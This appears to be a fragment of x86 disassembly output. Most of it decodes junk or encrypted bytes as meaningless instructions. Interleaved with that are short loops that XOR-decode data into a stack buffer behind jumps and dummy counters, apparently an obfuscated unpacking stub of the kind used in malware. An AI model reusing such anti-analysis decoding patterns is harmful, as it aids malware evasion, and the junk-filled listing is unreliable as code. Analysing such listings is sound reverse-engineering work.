  410b24:	or     eax,0xf17e7e46
  410b29:	jg     0x410ba9
  410b2b:	jle    0x410afc
  410b2d:	mov    ds:0xb15a7c42,eax
  410b32:	jmp    0x410b58
  410b34:	xchg   cl,dh
  410b36:	push   ebp
  410b37:	pop    ss
  410b38:	je     0x410b5c
  410b3a:	jmp    DWORD PTR [ebp+0x37fa1dbd]
  410b40:	fxch   st(1)
  410b42:	stos   DWORD PTR es:[edi],eax
  410b43:	push   esi
  410b44:	stc    
  410b45:	ins    BYTE PTR es:[edi],dx
  410b46:	out    dx,al
  410b47:	mov    edx,0xbc11eadf
  410b4c:	push   0xf
  410b4e:	xchg   esp,eax
  410b4f:	add    ch,BYTE PTR [edi]
  410b51:	push   ecx
  410b52:	mov    esp,0x2e3b2c9
  410b57:	cmp    ch,BYTE PTR [eax+0x50]
  410b5a:	popa   
  410b5b:	dec    edx
  410b5c:	stos   BYTE PTR es:[edi],al
  410b5d:	push   DWORD PTR [ecx+0x74]
  410b60:	mov    bh,dl
  410b62:	test   eax,0xfcd7fe6c
  410b67:	out    0x72,al
  410b69:	call   0x27ada664
  410b6e:	xchg   edx,eax
  410b6f:	call   0x3ae4:0xdc993288
  410b76:	sub    ecx,0x58
  410b79:	sbb    eax,0x87200bd0
  410b7e:	ja     0x410b7c
  410b80:	es in  eax,0xab
  410b83:	jo     0x410b9a
  410b85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b86:	sub    esi,DWORD PTR [ebx+eiz*1-0x4405807f]
  410b8d:	cmp    esp,DWORD PTR [esi+0x7a]
  410b90:	mov    al,ds:0xaf27e8eb
  410b95:	dec    ebp
  410b96:	mov    ebp,0x8fd036f9
  410b9b:	cdq    
  410b9c:	repz aad 0xf7
  410b9f:	jbe    0x410b8a
  410ba1:	lods   eax,DWORD PTR ds:[esi]
  410ba2:	jmp    0x410ba0
  410ba4:	add    eax,0xf3cad313
  410ba9:	aas    
  410baa:	aaa    
  410bab:	dec    edi
  410bac:	fs push ds
  410bae:	pop    esi
  410baf:	out    dx,eax
  410bb0:	mov    BYTE PTR [ebp-0x9d2799d],dh
  410bb6:	xchg   esp,eax
  410bb7:	sbb    eax,0x58f2887f
  410bbc:	xor    eax,0x5f2b92fd
  410bc1:	cmp    DWORD PTR [edx],esi
  410bc3:	sar    DWORD PTR [eax+0xee4844b],0x2d
  410bca:	xchg   ecx,eax
  410bcb:	xchg   esp,eax
  410bcc:	mov    ebx,0xf79ac617
  410bd1:	loope  0x410c21
  410bd3:	test   al,0xa5
  410bd5:	jo     0x410bff
  410bd7:	dec    ecx
  410bd8:	int    0xbd
  410bda:	dec    eax
  410bdb:	sub    DWORD PTR [ebx+edx*2],esi
  410bde:	and    al,0x18
  410be0:	dec    ecx
  410be1:	scas   eax,DWORD PTR es:[edi]
  410be2:	fwait
  410be3:	cmp    dl,al
  410be5:	adc    DWORD PTR [ecx+0x30fd4228],ebp
  410beb:	imul   ebx,DWORD PTR [edi-0x68],0x6
  410bef:	mov    eax,0xf87422b5
  410bf4:	mov    ?,WORD PTR [edx-0x3261fe93]
  410bfa:	mov    esi,0x6d52b84a
  410bff:	sbb    DWORD PTR ds:0x19a275db,edi
  410c05:	jo     0x410b9f
  410c07:	int    0x30
  410c09:	fnstenv [edx]
  410c0b:	das    
  410c0c:	push   ss
  410c0d:	jmp    0xccd73e43
  410c12:	mov    ss,WORD PTR [eax]
  410c14:	adc    DWORD PTR [esi+0x15eefca3],ebp
  410c1a:	adc    al,0xa1
  410c1c:	js     0x410c36
  410c1e:	test   al,0xad
  410c20:	push   eax
  410c21:	cmp    cl,BYTE PTR [esi]
  410c23:	add    eax,0xef13a986
  410c28:	jne    0x410c33
  410c2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c2b:	add    al,0xa6
  410c2d:	cmp    cl,bh
  410c2f:	mov    edi,0x5c4ba7b5
  410c34:	stos   DWORD PTR es:[edi],eax
  410c35:	mov    al,0xc9
  410c37:	xchg   esi,eax
  410c38:	ret    
  410c39:	adc    BYTE PTR [edi+0x56e61181],ah
  410c3f:	das    
  410c40:	push   esp
  410c41:	inc    edi
  410c42:	mov    dh,0x98
  410c44:	xor    al,BYTE PTR [eax+0x23]
  410c47:	outs   dx,DWORD PTR ds:[esi]
  410c48:	mov    ebx,0x97c54888
  410c4d:	jg     0x410c13
  410c4f:	fstp   DWORD PTR [edi-0x1b]
  410c52:	sub    ch,0xeb
  410c55:	xor    eax,0x56cbbaf
  410c5a:	sub    eax,0x2f0e4e9d
  410c5f:	or     ah,BYTE PTR [eax]
  410c61:	jmp    0xdf35c755
  410c66:	jg     0x410c32
  410c68:	(bad)  
  410c69:	fmul   st(6),st
  410c6b:	pop    edx
  410c6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410c6d:	mov    dl,0xb9
  410c6f:	and    ebp,DWORD PTR [eax]
  410c71:	or     eax,0xcf9a5010
  410c76:	ud0    ecx,DWORD PTR [ebp-0x50]
  410c7a:	pop    ebx
  410c7b:	scas   eax,DWORD PTR es:[edi]
  410c7c:	shr    edi,cl
  410c7e:	out    dx,eax
  410c7f:	push   edx
  410c80:	rol    BYTE PTR [ecx],0x62
  410c83:	xchg   edi,eax
  410c84:	ins    DWORD PTR es:[edi],dx
  410c85:	sbb    bh,bl
  410c87:	or     eax,0x3e4bbe2c
  410c8c:	adc    al,0x2e
  410c8e:	sbb    eax,DWORD PTR [ebx]
  410c90:	shr    DWORD PTR [bp+di-0x7497],1
  410c95:	mov    bl,bl
  410c97:	fmul   DWORD PTR [eax-0x78b19cf1]
  410c9d:	mov    WORD PTR [edi-0x183cbe9e],cs
  410ca3:	jle    0x410cef
  410ca5:	mov    dh,BYTE PTR [edx-0x5d745fb4]
  410cab:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410cb2:	or     eax,eax
  410cb4:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  410cbb:	mov    eax,DWORD PTR [ebp-0x8]
  410cbe:	or     DWORD PTR ds:0x4337ef,0x3fd0
  410cc8:	mov    ecx,0x7510854
  410ccd:	mov    DWORD PTR ds:0x43372f,0x62c3
  410cd7:	push   esi
  410cd8:	xor    eax,ecx
  410cda:	or     esi,DWORD PTR ds:0x43372f
  410ce0:	mov    esi,0x32729b
  410ce5:	add    eax,esi
  410ce7:	jmp    0x410cfe
  410cec:	mov    dl,BYTE PTR [ebp-0x1]
  410cef:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  410cf3:	mov    DWORD PTR ds:0x43372f,0x530d
  410cfd:	inc    eax
  410cfe:	mov    DWORD PTR ds:0x43376b,0x3584
  410d08:	cmp    eax,0x40
  410d0b:	mov    DWORD PTR ds:0x43377f,0x3d5c
  410d15:	jb     0x410cec
  410d1b:	mov    eax,ds:0x43372f
  410d20:	add    eax,DWORD PTR ds:0x433803
  410d26:	mov    ds:0x43372f,eax
  410d2b:	mov    edx,DWORD PTR [ebp-0x8]
  410d2e:	mov    DWORD PTR ds:0x43383f,0x17
  410d38:	cmp    DWORD PTR ds:0x43383f,0x0
  410d3f:	je     0x410d94
  410d45:	cmp    DWORD PTR ds:0x43383f,0x4
  410d4c:	jne    0x410d69
  410d52:	push   DWORD PTR [ebp-0x20]
  410d55:	push   DWORD PTR [ebp-0x28]
  410d58:	push   DWORD PTR [ebp-0xc]
  410d5b:	push   DWORD PTR [ebp-0x1c]
  410d5e:	push   0x2fed
  410d63:	call   DWORD PTR ds:0x4123b0
  410d69:	cmp    DWORD PTR ds:0x43383f,0x5
  410d70:	jne    0x410d84
  410d76:	xor    eax,eax
  410d78:	xor    eax,DWORD PTR ds:0x43383f
  410d7e:	dec    eax
  410d7f:	mov    ds:0x43383f,eax
  410d84:	mov    eax,ds:0x43383f
  410d89:	dec    eax
  410d8a:	mov    ds:0x43383f,eax
  410d8f:	jmp    0x410d38
  410d94:	mov    eax,DWORD PTR [ebp-0xc]
  410d97:	add    DWORD PTR ds:0x433723,0x2cfa
  410da1:	xor    edx,ecx
  410da3:	sbb    DWORD PTR ds:0x43383b,0x4112
  410dad:	add    edx,esi
  410daf:	mov    DWORD PTR ds:0x4337b3,0x2f1c
  410db9:	cmp    edx,eax
  410dbb:	jmp    0x410f57
  410dc0:	adc    al,0x14
  410dc2:	in     al,0x8b
  410dc4:	in     al,0x6b
  410dc6:	jno    0x410d59
  410dc8:	aad    0x1d
  410dca:	dec    ebx
  410dcb:	add    cl,BYTE PTR [ebx+0x34]
  410dce:	sbb    esi,0xffffff8c
  410dd1:	inc    edi
  410dd2:	jle    0x410e52
  410dd4:	icebp  
  410dd5:	jg     0x410e55
  410dd7:	jle    0x410dae
  410dd9:	mov    ah,0x2e
  410ddb:	xchg   edx,eax
  410ddc:	push   edx
  410ddd:	sub    eax,0x501a45ee
  410de2:	or     bh,cl
  410de4:	push   ecx
  410de5:	test   eax,0xcd38384f
  410dea:	xor    eax,0xcd6b1b31
  410def:	mov    ds:0xc85d604d,al
  410df4:	mov    bl,0x7c
  410df6:	push   es
  410df7:	sbb    DWORD PTR ds:0x9f4ff2b4,edx
  410dfd:	in     al,0x49
  410dff:	imul   DWORD PTR [edi-0x5e97b2a6]
  410e05:	fild   WORD PTR [edx+edx*1+0x4e]
  410e09:	jge    0x410e31
  410e0b:	dec    edx
  410e0c:	inc    ebx
  410e0d:	js     0x410e07
  410e0f:	sub    eax,0x75d64399
  410e14:	loopne 0x410dc9
  410e16:	(bad)  
  410e17:	jno    0x410df7
  410e19:	stc    
  410e1a:	sub    BYTE PTR [eax],bh
  410e1c:	ret    
  410e1d:	into   
  410e1e:	and    eax,0x820dfccb
  410e23:	shr    DWORD PTR [ebx-0x3c],0x4d
  410e27:	mov    eax,ds:0x7f52072d
  410e2c:	shr    DWORD PTR [ebx+0x37157666],cl
  410e32:	mov    ds:0x30c3bfd5,eax
  410e37:	push   ecx
  410e38:	jae    0x410e63
  410e3a:	mov    al,ds:0x2c43bc46
  410e3f:	sub    al,0xa9
  410e41:	sub    al,al
  410e43:	dec    esi
  410e44:	jle    0x410eba
  410e46:	xor    al,0xa1
  410e48:	nop
  410e49:	cmp    dl,dh
  410e4b:	mov    ah,0x74
  410e4d:	mov    ah,0xd2
  410e4f:	or     BYTE PTR [ebp-0x3109a9a5],dl
  410e55:	xchg   edx,eax
  410e56:	mov    ds,WORD PTR [ebx-0xd]
  410e59:	sub    eax,0xdfb7f00
  410e5e:	imul   eax,edx,0x81a272de
  410e64:	les    edi,FWORD PTR [ebp-0x2f1ed2a9]
  410e6a:	stos   DWORD PTR es:[edi],eax
  410e6b:	adc    DWORD PTR [ebp+0x2c],0xffffffd6
  410e6f:	(bad)  
  410e70:	xor    al,0x36
  410e72:	pop    ecx
  410e73:	dec    edx
  410e74:	jnp    0x410ea4
  410e76:	int    0x56
  410e78:	and    bl,BYTE PTR [esi+0x7f]
  410e7b:	push   edi
  410e7c:	mov    ah,0xe7
  410e7e:	jg     0x410e3d
  410e80:	fnstenv [ecx]
  410e82:	jnp    0x410eeb
  410e84:	add    edi,DWORD PTR [ecx+0x2ea60a22]
  410e8a:	stc    
  410e8b:	in     al,0xe1
  410e8d:	xchg   BYTE PTR [ebp-0x27],cl
  410e90:	lods   eax,DWORD PTR ds:[esi]
  410e91:	xchg   ecx,eax
  410e92:	les    esi,FWORD PTR [ebp+0x37d7f0b2]
  410e98:	pop    es
  410e99:	js     0x410ead
  410e9b:	add    eax,0x5721ac69
  410ea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ea1:	cmp    ebp,DWORD PTR [edx]
  410ea3:	or     DWORD PTR [eax+0x6d09a0b5],ebp
  410ea9:	and    ebx,DWORD PTR [edi]
  410eab:	loop   0x410ead
  410ead:	mov    edi,0x9a398fc4
  410eb2:	popf   
  410eb3:	cmp    ebp,DWORD PTR [edx+0x18]
  410eb6:	pushf  
  410eb7:	fcom   QWORD PTR [ecx+0x3fa314ff]
  410ebd:	lds    edi,FWORD PTR [ebx-0x3f6567bb]
  410ec3:	xchg   ebp,eax
  410ec4:	adc    DWORD PTR [esi],ecx
  410ec6:	dec    ecx
  410ec7:	cmp    edi,DWORD PTR [ebp-0x2f]
  410eca:	dec    esi
  410ecb:	stc    
  410ecc:	cmp    al,cl
  410ece:	(bad)  
  410ecf:	sbb    eax,edi
  410ed1:	push   0xe
  410ed3:	fisubr DWORD PTR [edx+0x14f2b5d7]
  410ed9:	in     al,0xe5
  410edb:	sahf   
  410edc:	aaa    
  410edd:	fbld   TBYTE PTR [eax+0x18]
  410ee0:	push   ds
  410ee1:	imul   BYTE PTR ds:0x8857f1c2
  410ee7:	jp     0x410f0d
  410ee9:	sbb    BYTE PTR [edi],bl
  410eeb:	lds    ebx,FWORD PTR [ecx+eiz*4+0x53d6656a]
  410ef2:	and    al,0xcb
  410ef4:	jg     0x410ed4
  410ef6:	mov    ebp,0xef3b7de7
  410efb:	call   0xd195a6b2
  410f00:	fcom   st(2)
  410f02:	sbb    al,ah
  410f04:	sub    BYTE PTR [eax+eiz*1-0x1c07345],bl
  410f0b:	inc    ebp
  410f0c:	popa   
  410f0d:	fst    DWORD PTR [ecx-0x30]
  410f10:	stos   BYTE PTR es:[edi],al
  410f11:	and    eax,DWORD PTR [ecx+eax*4]
  410f14:	xchg   DWORD PTR [ecx-0xc],ecx
  410f17:	mov    ch,0x1b
  410f19:	jle    0x410f69
  410f1b:	out    dx,eax
  410f1c:	mov    cl,0x44
  410f1e:	inc    ecx
  410f1f:	jg     0x410f7a
  410f21:	or     BYTE PTR [esi-0x6b],0x69
  410f25:	push   ebp
  410f26:	mov    esi,0x6b9fce89
  410f2b:	and    BYTE PTR [ecx+eax*2+0x54],bh
  410f2f:	loope  0x410eda
  410f31:	cmp    BYTE PTR [edx+0x3],0xc2
  410f35:	inc    eax
  410f36:	mov    esp,0xdf1bc942
  410f3b:	loope  0x410f41
  410f3d:	sub    al,0x92
  410f3f:	mov    dl,0x92
  410f41:	pop    ebx
  410f42:	jo     0x410f17
  410f44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f45:	(bad)  
  410f46:	cmp    eax,DWORD PTR [ebx+0x43]
  410f49:	xlat   BYTE PTR ds:[ebx]
  410f4a:	das    
  410f4b:	mov    bh,0xbe
  410f4d:	aaa    
  410f4e:	je     0x410f24
  410f50:	sub    DWORD PTR [esi+0x18],esp
  410f53:	dec    ebp
  410f54:	inc    ebx
  410f55:	ins    DWORD PTR es:[edi],dx
  410f56:	mov    cl,BYTE PTR [edi]
  410f58:	test   BYTE PTR [edi+0x2],dl
  410f5b:	add    BYTE PTR [eax],al
  410f5d:	xor    eax,eax
  410f5f:	add    eax,DWORD PTR ds:0x43382f
  410f65:	sub    DWORD PTR ds:0x433833,eax
  410f6b:	push   ebx
  410f6c:	sub    eax,0x37b3
  410f71:	push   edi
  410f72:	mov    DWORD PTR ds:0x43377f,0x14
  410f7c:	cmp    DWORD PTR ds:0x43377f,0x0
  410f83:	je     0x410fda
  410f89:	cmp    DWORD PTR ds:0x43377f,0x2
  410f90:	jne    0x410fac
  410f96:	push   0x4337b3
  410f9b:	push   DWORD PTR [ebp-0x24]
  410f9e:	push   DWORD PTR [ebp-0x24]
  410fa1:	push   0x4a42
  410fa6:	call   DWORD PTR ds:0x4123b4
  410fac:	cmp    DWORD PTR ds:0x43377f,0x3
  410fb3:	jne    0x410fc6
  410fb9:	mov    edi,DWORD PTR ds:0x43377f
  410fbf:	dec    edi
  410fc0:	mov    DWORD PTR ds:0x43377f,edi
  410fc6:	xor    edi,edi
  410fc8:	or     edi,DWORD PTR ds:0x43377f
  410fce:	dec    edi
  410fcf:	mov    DWORD PTR ds:0x43377f,edi
  410fd5:	jmp    0x410f7c
  410fda:	mov    edi,DWORD PTR [ebp+0x8]
  410fdd:	mov    eax,0x8a3c
  410fe2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410fe7:	jmp    0x411183
  410fec:	mov    dh,0xd4
  410fee:	ja     0x411052
  410ff0:	jne    0x411053
  410ff2:	mov    bl,0xd0
  410ff4:	ins    DWORD PTR es:[edi],dx
  410ff5:	push   edi
  410ff6:	push   ss
  410ff7:	push   ecx
  410ff8:	cmp    BYTE PTR [ecx+0x450fae8d],0x7e
  410fff:	jle    0x410ff2
  411001:	jg     0x411081
  411003:	jle    0x410faa
  411005:	inc    edi
  411006:	in     eax,dx
  411007:	test   al,0x1
  411009:	test   DWORD PTR [edi-0x72],0xe5e9fccd
  411010:	leave  
  411011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411012:	inc    ebp
  411013:	(bad)  
  411014:	sti    
  411015:	repnz mov ecx,0x8d630448
  41101b:	dec    ebp
  41101c:	stc    
  41101d:	pop    esi
  41101e:	mov    edx,0x1b24374a
  411023:	sbb    DWORD PTR [edi+0x9],ebp
  411026:	push   edx
  411027:	cs mov edx,0x39f04dd7
  41102d:	pop    ds
  41102e:	and    DWORD PTR [edx+0x2d],eax
  411031:	loope  0x411054
  411033:	lods   al,BYTE PTR ds:[esi]
  411034:	test   BYTE PTR [ebp+0x54],cl
  411037:	mov    ?,WORD PTR [ecx-0x54]
  41103a:	dec    edx
  41103b:	push   ds
  41103c:	sub    esi,esp
  41103e:	out    dx,eax
  41103f:	push   0x2c
  411041:	mov    eax,0x376b0a18
  411046:	mov    bl,0x4b
  411048:	push   ss
  411049:	sbb    esp,edi
  41104b:	sub    BYTE PTR [esi],al
  41104d:	iret   
  41104e:	aad    0xef
  411050:	adc    BYTE PTR [edx+edi*2],al
  411053:	add    DWORD PTR [ebx-0x68],0x656c9636
  41105a:	popf   
  41105b:	in     al,0xff
  41105d:	jge    0x4110c2
  41105f:	dec    eax
  411060:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411061:	sub    al,0xa6
  411063:	mov    ch,0xcb
  411065:	push   ss
  411066:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411067:	xchg   DWORD PTR [ecx+0x2f],edx
  41106a:	mov    edx,0x81629c0d
  41106f:	xor    al,0xec
  411071:	xchg   ecx,eax
  411072:	jne    0x4110e6
  411074:	xor    eax,0x9d2a457c
  411079:	and    eax,0xb04669fb
  41107e:	mov    WORD PTR [edi-0x358e802],gs
  411084:	stc    
  411085:	lea    eax,[esi-0x44]
  411088:	mov    ?,ebx
  41108a:	sahf   
  41108b:	(bad)  
  41108c:	mov    dh,0x20
  41108e:	jo     0x411076
  411090:	lods   al,BYTE PTR ds:[esi]
  411091:	pop    ecx
  411092:	ret    0x5a2e
  411095:	inc    edx
  411096:	pop    esi
  411097:	pop    ebp
  411098:	leave  
  411099:	sub    DWORD PTR [edi+0xfbaf486],0x4b
  4110a0:	daa    
  4110a1:	(bad)  
  4110a2:	xor    al,0xcc
  4110a4:	jecxz  0x4110ce
  4110a6:	or     bl,BYTE PTR [edi+0x73]
  4110a9:	xchg   edx,eax
  4110aa:	mov    al,ch
  4110ac:	xor    bl,dh
  4110ae:	dec    ebp
  4110af:	stos   DWORD PTR es:[edi],eax
  4110b0:	loope  0x411051
  4110b2:	outs   dx,BYTE PTR ds:[esi]
  4110b3:	xor    ebx,DWORD PTR [esi]
  4110b5:	les    eax,FWORD PTR [edi]
  4110b7:	push   ss
  4110b8:	lods   eax,DWORD PTR ds:[esi]
  4110b9:	sub    al,0xc5
  4110bb:	lahf   
  4110bc:	sbb    dh,dl
  4110be:	in     eax,0x72
  4110c0:	and    ch,BYTE PTR [ebx-0xf]
  4110c3:	aad    0xb3
  4110c5:	pop    ecx
  4110c6:	adc    al,0x40
  4110c8:	push   eax
  4110c9:	xor    al,BYTE PTR [esi+0x25]
  4110cc:	mov    bl,0x51
  4110ce:	xchg   DWORD PTR [ecx-0x2a],ebp
  4110d1:	cwde   
  4110d2:	pusha  
  4110d3:	nop
  4110d4:	fstp   QWORD PTR [ebx]
  4110d6:	pop    edx
  4110d7:	adc    DWORD PTR [ebp+0x103c799c],eax
  4110dd:	fiadd  WORD PTR [ecx-0x32]
  4110e0:	inc    eax
  4110e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110e2:	push   esi
  4110e3:	jb     0x41114e
  4110e5:	imul   esp,DWORD PTR [edi*8-0xd827516],0x45
  4110ed:	into   
  4110ee:	outs   dx,DWORD PTR ds:[esi]
  4110ef:	mov    esp,0x1d560fcc
  4110f4:	dec    ebp
  4110f5:	add    eax,ecx
  4110f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110f8:	add    DWORD PTR [esi],0x3496e01d
  4110fe:	daa    
  4110ff:	lds    ecx,FWORD PTR [ebx+edi*8-0x29e471ae]
  411106:	inc    esp
  411107:	fnstenv [ecx+0x2ca74ffd]
  41110d:	cwde   
  41110e:	je     0x4110a1
  411110:	jae    0x4110aa
  411112:	shr    DWORD PTR [ebx-0x24],cl
  411115:	mul    BYTE PTR [ecx-0x77]
  411118:	sbb    ch,BYTE PTR [ecx+0x4]
  41111b:	mov    dl,0x18
  41111d:	mov    cs,WORD PTR [edx-0x2d737b8c]
  411123:	enter  0xd390,0x39
  411127:	inc    ebx
  411128:	mov    dh,0xb6
  41112a:	je     0x411186
  41112c:	push   ss
  41112d:	mov    ebx,0x7c042fe5
  411132:	xor    DWORD PTR [edx+edx*8],ecx
  411135:	ret    0x2147
  411138:	rol    DWORD PTR [ecx+eiz*2-0x2f],0x45
  41113d:	sbb    DWORD PTR [eax-0x9],eax
  411140:	addr16 jo 0x4111c1
  411143:	inc    ebx
  411144:	dec    ebp
  411145:	or     DWORD PTR [edi-0x6f],esp
  411148:	jmp    0x411159
  41114a:	mov    fs,ecx
  41114c:	loop   0x4110d2
  41114e:	ins    BYTE PTR es:[edi],dx
  41114f:	(bad)  
  411150:	mov    bh,0x43
  411152:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411153:	xor    edx,edi
  411155:	or     ch,BYTE PTR [eax+eiz*1+0x4c]
  411159:	loope  0x4110e9
  41115b:	(bad)  
  41115c:	xchg   edx,eax
  41115d:	jle    0x41116c
  41115f:	xor    dl,BYTE PTR [esi]
  411161:	mov    al,BYTE PTR [ecx-0x6fc1e7ed]
  411167:	scas   al,BYTE PTR es:[edi]
  411168:	repz hlt 
  41116a:	fnstcw WORD PTR [ebp-0x20c53290]
  411170:	fdiv   DWORD PTR [edx+0x6b694545]
  411176:	ins    DWORD PTR es:[edi],dx
  411177:	(bad)  
  411178:	lea    edx,[esi-0x4e815ccf]
  41117e:	add    edx,edx
  411180:	iret   
  411181:	and    esp,DWORD PTR [edx+0x3b02bf]
  411187:	add    BYTE PTR [esi+0x3],ah
  41118a:	(bad)  
  41118b:	movzx  eax,ax
  41118e:	mov    DWORD PTR [ebp-0x14],eax
  411191:	mov    eax,DWORD PTR [ebp+0x8]
  411194:	movzx  eax,WORD PTR [eax+edx*4]
  411198:	xor    eax,0x8a3c
  41119d:	add    eax,edi
  41119f:	mov    edi,DWORD PTR [ebp-0x14]
  4111a2:	mov    BYTE PTR [ebp+edi*1-0x58],al
  4111a6:	mov    eax,DWORD PTR [ebp-0xc]
  4111a9:	inc    edx
  4111aa:	cmp    edx,eax
  4111ac:	jne    0x410f72
  4111b2:	pop    edi
  4111b3:	pop    ebx
  4111b4:	mov    eax,DWORD PTR [ebp-0x8]
  4111b7:	mov    edx,DWORD PTR [ebp+0x10]
  4111ba:	xor    eax,ecx
  4111bc:	add    eax,esi
  4111be:	mov    DWORD PTR [edx],eax
  4111c0:	mov    eax,DWORD PTR [ebp-0x8]
  4111c3:	xor    eax,ecx
  4111c5:	add    eax,esi
  4111c7:	mov    DWORD PTR [ebp+0x8],eax
  4111ca:	mov    eax,DWORD PTR [ebp+0x8]
  4111cd:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4111d1:	mov    dl,BYTE PTR [ebp-0x1]
  4111d4:	cmp    al,dl
  4111d6:	je     0x4113b5
  4111dc:	mov    eax,DWORD PTR [ebp+0x8]
  4111df:	jmp    0x41137b
  4111e4:	mov    ah,0x98
  4111e6:	adc    al,ch
  4111e8:	adc    dh,BYTE PTR [ebp+0x71]
  4111eb:	imul   ebx,ebp,0xd0dabba7
  4111f1:	jecxz  0x411250
  4111f3:	jle    0xf1bf903b
  4111f9:	jg     0x411279
  4111fb:	jle    0x411216
  4111fd:	sar    BYTE PTR [esi],0x2
  411200:	pop    ebx
  411201:	call   0x5ebb6858
  411206:	outs   dx,DWORD PTR ds:[esi]
  411207:	push   ecx
  411208:	add    ebx,ecx
  41120a:	or     eax,0x4e6f2614
  41120f:	jne    0x411262
  411211:	aad    0x1d
  411213:	retf   
  411214:	addr16 das 
  411216:	sbb    eax,0x475cccdc
  41121b:	mov    dh,0x9
  41121d:	sbb    ebp,ebx
  41121f:	xchg   esi,eax
  411220:	aaa    
  411221:	pop    ds
  411222:	push   edi
  411224:	sbb    esp,DWORD PTR [esi]
  411226:	pusha  
  411227:	sub    ecx,ecx
  411229:	push   ss
  41122a:	loopne 0x4111e0
  41122c:	jle    0x4111e9
  41122e:	cmp    DWORD PTR [ebx],esi
  411230:	mov    cl,0x7b
  411232:	jg     0x41125b
  411234:	jne    0x4111db
  411236:	jmp    0x41121a
  411238:	mov    esp,0x9399025c
  41123d:	or     al,0x4d
  41123f:	nop
  411240:	mov    al,ds:0x7a2ea651
  411245:	out    dx,al
  411246:	stos   DWORD PTR es:[edi],eax
  411247:	mov    WORD PTR ds:0x48c09cb6,?
  41124d:	mov    bl,BYTE PTR [ecx-0x450b42f4]
  411253:	in     eax,0x3c
  411255:	sub    DWORD PTR [ecx-0x60ec52c3],ebx
  41125b:	lods   al,BYTE PTR ds:[esi]
  41125c:	xlat   BYTE PTR ds:[ebx]
  41125d:	int3   
  41125e:	outs   dx,BYTE PTR ds:[esi]
  41125f:	push   ecx
  411260:	xor    DWORD PTR [edi+0x78],eax
  411263:	or     esp,DWORD PTR [edx]
  411265:	(bad)  
  411266:	hlt    
  411267:	mov    dh,0x5a
  411269:	stos   DWORD PTR es:[edi],eax
  41126a:	aad    0xc9
  41126c:	fmul   DWORD PTR [edi]
  41126e:	stos   DWORD PTR es:[edi],eax
  41126f:	aad    0x94
  411271:	or     esi,esp
  411273:	int    0xa9
  411275:	mov    eax,0xb38825c7
  41127a:	mov    edx,0x2bf22afe
  41127f:	test   DWORD PTR [edx+0x71536f92],ebp
  411285:	cld    
  411286:	dec    esp
  411287:	inc    esi
  411288:	call   0xb485:0x423a7b7d
  41128f:	mov    ebx,0x3928a778
  411294:	fiadd  WORD PTR [ebx]
  411296:	mov    al,ds:0x6b8c6d5e
  41129b:	ins    DWORD PTR es:[edi],dx
  41129c:	fs icebp 
  41129e:	adc    DWORD PTR [edi],esp
  4112a0:	or     eax,0x81d57b3e
  4112a5:	and    esp,DWORD PTR [ebp-0x6a]
  4112a8:	cmp    eax,0xf98443cd
  4112ad:	repnz mov ebx,0xbb42b1af
  4112b3:	mov    BYTE PTR [ebp+0x4],al
  4112b6:	or     eax,0x6c2e3d7b
  4112bb:	call   0xd909fe4e
  4112c0:	outs   dx,DWORD PTR ds:[esi]
  4112c1:	js     0x4112ac
  4112c3:	adc    BYTE PTR [edi+0x16],al
  4112c6:	loop   0x4112e1
  4112c8:	mov    ebx,0xc8e2957e
  4112cd:	and    ah,BYTE PTR [eax+0x6020d26a]
  4112d3:	sub    edi,DWORD PTR [ecx+ecx*2+0x19]
  4112d7:	pop    edi
  4112d8:	or     bh,BYTE PTR [esi]
  4112da:	pop    ss
  4112db:	inc    ecx
  4112dc:	and    eax,0x37ba0c22
  4112e1:	add    esp,DWORD PTR [esi+0x60]
  4112e4:	into   
  4112e5:	mov    al,ds:0x343da3a0
  4112ea:	mov    eax,ds:0x8cbf0fbf
  4112ef:	sahf   
  4112f0:	syscall 
  4112f2:	cs dec ebx
  4112f4:	fiadd  DWORD PTR [ebp-0x62]
  4112f7:	test   DWORD PTR [eax],edi
  4112f9:	xor    BYTE PTR [edx+ebx*8-0x61],ah
  4112fd:	add    dl,0xea
  411300:	sbb    BYTE PTR [ebx-0x9],0x32
  411304:	jecxz  0x411364
  411306:	popa   
  411307:	into   
  411308:	xchg   ebp,eax
  411309:	scas   eax,DWORD PTR es:[edi]
  41130a:	dec    edx
  41130b:	stos   BYTE PTR es:[edi],al
  41130c:	(bad)  
  41130d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41130e:	and    DWORD PTR [esi-0x128a8c69],ebp
  411314:	mov    ecx,ebx
  411316:	dec    edx
  411317:	outs   dx,BYTE PTR ds:[esi]
  411318:	aas    
  411319:	aaa    
  41131a:	ins    DWORD PTR es:[edi],dx
  41131b:	push   esp
  41131c:	push   ds
  41131d:	push   0xffffffda
  41131f:	jmp    0x38f8:0x8fce734b
  411326:	xor    dh,ch
  411328:	rcl    DWORD PTR [edx+esi*4-0x34384376],0xff
  411330:	ja     0x41136e
  411332:	add    DWORD PTR [ebx-0x72],esi
  411335:	push   edx
  411336:	or     ch,ch
  411338:	xchg   ebx,eax
  411339:	ss popf 
  41133b:	xor    ah,BYTE PTR [ecx+eax*1+0x36]
  41133f:	rol    BYTE PTR [esi+0xe],1
  411342:	rol    BYTE PTR [esi-0x41c1f6f1],1
  411348:	pop    ecx
  411349:	and    eax,0x5eeb2fe4
  41134e:	pop    eax
  41134f:	sar    BYTE PTR [edi+0x53f8a8b9],0x48
  411356:	dec    eax
  411357:	sub    al,BYTE PTR [ebp+0x1]
  41135a:	pop    edx
  41135b:	aas    
  41135c:	imul   esi,DWORD PTR ds:0x76d79f82,0xb7b2c908
  411366:	jmp    0x3d70f1ed
  41136b:	hlt    
  41136c:	mov    ah,0x83
